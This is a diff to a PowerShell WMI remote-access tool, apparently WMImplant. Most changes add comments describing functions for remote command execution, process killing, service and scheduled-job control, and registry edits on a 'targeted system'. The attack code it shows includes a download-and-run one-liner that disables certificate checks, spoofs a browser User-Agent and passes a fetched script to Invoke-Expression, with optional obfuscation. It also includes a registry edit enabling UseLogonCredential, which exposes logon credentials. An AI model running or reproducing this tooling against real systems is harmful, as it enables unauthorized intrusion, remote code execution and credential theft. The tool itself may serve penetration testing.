@@ -234,16 +234,18 @@ function Enable-WinRMWMI
 
         # Restarting firewall service
         Write-Verbose 'Attempting to stop MpsSvc'
-        (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StopService() | Out-Null
+        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StopService()
         Start-Sleep -Seconds 10
         Write-Verbose 'Attempting to start MpsSvc'
-        (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StartService() | Out-Null
+        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StartService()
         Start-Sleep -Seconds 10
     }
 }
 
 function Find-CurrentUsers
 {
+    # This function list user accounts with active processes
+    # on the targeted system
     param
     (
         #Parameter assignment
@@ -284,6 +286,9 @@ function Find-CurrentUsers
 
 function Find-VacantComputer
 {
+    # This function gathers running processes on the targeted system and tries to find
+    # a screensaver or windows login process.  It also attempts to enumerate active accounts
+    # on the targeted system through Win32_computersystem
     param
     (
         #Parameter assignment
@@ -329,7 +334,6 @@ function Find-VacantComputer
 
         try
         {
-            $user = $null
             if($Creds)
             {
                 $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop | select -ExpandProperty username
@@ -356,6 +360,8 @@ function Find-VacantComputer
 
 function Get-ComputerDrives
 {
+    # This function attempts to list local and network drives attached to the
+    # targeted system
     param
     (
         #Parameter assignment
@@ -390,6 +396,7 @@ function Get-ComputerDrives
 
 function Get-HostInfo
 {
+    # This function attempts to gather basic information about the targeted system
     param
     (
         #Parameter assignment
@@ -441,6 +448,7 @@ function Get-HostInfo
 
 function Get-InstalledPrograms
 {
+    # This functions retrieves applications that have been installed on the targeted system
     param
     (
         #Parameter assignment
@@ -506,6 +514,8 @@ function Get-InstalledPrograms
 
 function Get-NetworkCards
 {
+    # This function is designed to check for actie IPs on remote Systems
+    # and print any systems with multiple NICs
     param
     (
         #Parameter assignment
@@ -545,6 +555,7 @@ function Get-NetworkCards
 
 function Get-ProcessListingWMImplant
 {
+    # This function lists all running processes on the targeted system
     param
     (
         #Parameter assignment
@@ -655,6 +666,8 @@ Path to save output to
 
 function Invoke-CommandExecution
 {
+    # This function allows you to run a command-line command on the targeted system and
+    # receive its output
     param
     (
         #Parameter assignment
@@ -724,6 +737,8 @@ function Invoke-CommandExecution
 
 function Invoke-CommandGeneration
 {
+    # This function generates the command line command users would run to invoke WMImplant
+    # in a non-interactive manner
     Show-WMImplantMainMenu
 
     # Read in user's menu choice
@@ -1383,6 +1398,7 @@ function Invoke-CommandGeneration
 
 function Invoke-JobMod
 {
+    # This function allows users to list, delete, or create scheduled jobs on the targeted system
     param
     (
         #Parameter assignment
@@ -1503,6 +1519,7 @@ function Invoke-JobMod
 
 function Invoke-ProcessPunisher
 {
+    # This function kills a process on the targeted system via name or PID
     param
     (
         #Parameter assignment
@@ -1578,6 +1595,7 @@ function Invoke-ProcessPunisher
 
 function Invoke-PowerOptionsWMI
 {
+    # This function allows users to poweroff, reboot, or log users off the targeted system
     param
     (
         #Parameter assignment
@@ -1654,6 +1672,8 @@ function Invoke-PowerOptionsWMI
 
 function Invoke-ProcSpawn
 {
+    # This function starts a user provided process on the targeted system
+    # (File/executable must already be on the system)
     param
     (
         #Parameter assignment
@@ -1695,6 +1715,8 @@ function Invoke-ProcSpawn
 
 function Invoke-RegValueMod
 {
+    # This function allows you to modify the registry on a remote system.  At the moment, it's
+    # largely constrained to STRING type mods, although this is beginning to expand
     param
     (
         #Parameter assignment
@@ -1793,7 +1815,7 @@ function Invoke-RegValueMod
 
                 else
                 {
-                    if($RegValue -eq "UseLogonCredential")
+                    if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig")
                     {
                         Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target
                     }
@@ -1823,6 +1845,8 @@ function Invoke-RegValueMod
 
 function Invoke-RemoteScriptWithOutput
 {
+    # This function will start a new PowerShell process on the targeted system, IEX load a user specified script,
+    # run the user specified function, store the output, and retrieve the output
     param
     (
         [Parameter(Mandatory = $False)]
@@ -1855,12 +1879,13 @@ function Invoke-RemoteScriptWithOutput
             $Function = $Function.Trim()
         }
 
-        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
         # Saving original WMI Property value
         $Original_WMIProperty = (Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
 
         Write-Verbose "Building PowerShell command"
 
+        # Separating the commands out to make it a little earier to view/understand what is happening
         $remote_command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
         $remote_command += "'$Url'"
         $remote_command += ')); $output = '
@@ -1879,8 +1904,8 @@ function Invoke-RemoteScriptWithOutput
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        # Grab file from remote system's registry
-        Write-Verbose "Sleeping, and then reading file from remote registry"
+        # Grab file from remote system
+        Write-Verbose "Sleeping, and then reading file from remote system"
         Start-Sleep -s 30
 
         $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
@@ -1900,6 +1925,7 @@ function Invoke-RemoteScriptWithOutput
 
 function Invoke-ServiceMod
 {
+    # This script allows users to start, stop, create, and delete services on the targeted host
     param
     (
         [Parameter(Mandatory = $False)]
